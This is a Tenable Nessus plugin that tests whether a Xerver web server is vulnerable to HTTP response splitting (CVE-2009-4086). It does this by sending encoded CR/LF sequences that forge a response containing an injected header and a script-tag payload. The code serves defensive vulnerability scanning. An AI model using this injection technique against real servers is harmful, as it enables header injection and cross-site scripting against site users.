#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(42896);
  script_version("$Revision: 1.10 $");
 script_cvs_date("$Date: 2016/05/04 18:02:24 $");

  script_cve_id("CVE-2009-4086");
  script_bugtraq_id(37064);
  script_osvdb_id(60657);
  script_xref(name:"Secunia", value:"36681");

  script_name(english:"Xerver HTTP Response Splitting");
  script_summary(english:"Attempts a XSS attack via HTTP response splitting");

  script_set_attribute(attribute:"synopsis", value:"The remote web server has an HTTP response splitting vulnerability.");
  script_set_attribute(
    attribute:"description",
    value:
"The version of Xerver running on the remote host has an HTTP response
splitting vulnerability due to its failure to sanitize specially
encoded carriage return and newline characters.  A remote attacker
could exploit this by tricking a user into requesting a maliciously
crafted URL, resulting in the injection of HTTP headers, HTML, or
script code."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.exploit-db.com/exploits/10170");
  script_set_attribute(attribute:"solution", value:"There is no known solution at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/11/18");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/11/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_require_ports("Services/www", 80);
  script_dependencies("http_version.nasl");
  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");


port = get_http_port(default:80);

if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!isnull(banner) && 'Xerver' >!< banner)
    exit(0, 'The web server on port '+port+' does not appear to be Xerver.');
}

crlf = '%C0%8D%C0%8A';
hdr_name = 'X-' + str_replace(string:SCRIPT_NAME, find:'.', replace:'-');
time = unixtime();
xss = "<script>alert('" + SCRIPT_NAME + '-' + unixtime() + "')</script>";

# Attempt to inject a header and some data
req =
  '/' + crlf +
  'HTTP/1.1 200 OK' + crlf +
  'Content-Length: ' + strlen(xss) + crlf +
  'Content-Type: text/html' + crlf +
  hdr_name + ': ' + time + crlf +
  crlf +
  xss
;

unreserved = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*()-]%/";
url = urlencode(str:req, unreserved:unreserved);

res = http_send_recv3(method:"GET", item:url, port:port, fetch404:TRUE, exit_on_fail: 1);

headers = parse_http_headers(status_line:res[0], headers:res[1]);
if (isnull(headers)) exit(1, 'Error parsing HTTP headers on port '+port+'.');

# Extract the HTTP header we attempted to inject
injected_hdr = headers[tolower(hdr_name)];
if (isnull(injected_hdr))
  exit(0, 'The web server on port '+port+' did not respond with the header the plugin tried to inject.');

pat = str_replace(string:xss, find:"(", replace:"\(");
pat = str_replace(string:pat, find:")", replace:"\)");

# Check if we were able to successfully inject a header _and_ some script code
if (injected_hdr == time && ereg(string:res[2], pattern:'^' + pat))
{
  set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);

  if (report_verbosity > 0)
  {
    report = get_vuln_report(items:url, port:port);
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
else exit(0, 'The web server on port ' + port + ' is not affected.');

